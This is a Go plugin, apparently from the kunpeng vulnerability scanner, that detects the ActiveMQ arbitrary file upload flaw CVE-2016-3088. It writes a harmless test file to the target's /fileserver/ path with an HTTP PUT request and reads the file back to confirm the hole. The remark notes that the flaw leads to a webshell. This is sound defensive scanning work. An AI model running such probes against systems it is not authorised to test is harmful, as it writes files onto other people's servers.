package goplugin

import (
	"net/http"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type activemqUpload struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("activemq", &activemqUpload{})
}
func (d *activemqUpload) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "ActiveMQ 任意文件写入漏洞",
		Remarks: "通过PUT请求，攻击者可上传文件到web目录，再通过MOVE得到webshell，导致服务器被入侵控制。",
		Level:   0,
		Type:    "UPLOAD",
		Author:  "wolf",
		References: plugin.References{
			URL: "https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2016-3088",
			CVE: "CVE-2016-3088",
		},
	}
	return d.info
}
func (d *activemqUpload) GetResult() []plugin.Plugin {
	return d.result
}
func (d *activemqUpload) Check(URL string, meta plugin.TaskMeta) bool {
	putURL := URL + "/fileserver/" + util.GetRandomString(6) + ".txt"
	request, err := http.NewRequest("PUT", putURL, strings.NewReader("vultest"))
	if err != nil {
		return false
	}
	_, err = util.RequestDo(request, false)
	if err != nil {
		return false
	}
	vRequest, err := http.NewRequest("GET", putURL, nil)
	if err != nil {
		return false
	}
	resp, err := util.RequestDo(vRequest, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "vultest") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
